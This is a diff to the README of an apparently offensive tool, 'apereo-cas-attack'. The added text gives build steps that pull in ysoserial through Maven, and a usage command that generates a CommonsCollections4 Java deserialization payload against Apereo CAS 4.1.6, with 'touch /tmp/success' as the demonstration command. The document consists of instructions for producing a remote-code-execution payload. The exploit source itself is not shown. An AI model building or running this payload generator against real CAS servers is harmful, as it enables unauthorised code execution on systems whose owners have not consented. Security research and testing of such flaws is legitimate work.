@@ -1,5 +1,7 @@
 # Apereo-CAS attack
 
+## Installation
+
 Steps to install:
 
 - Download [ysoserial](https://github.com/frohoff/ysoserial) to `ysoserial-master-30099844c6-1.jar`
@@ -14,3 +16,11 @@ mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=ysos
 ```
 mvn clean package assembly:single
 ```
+
+## Usage
+
+Generate a `CommonsCollections4` Payload for Apereo-CAS 4.1.6:
+
+```
+java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
+``` 
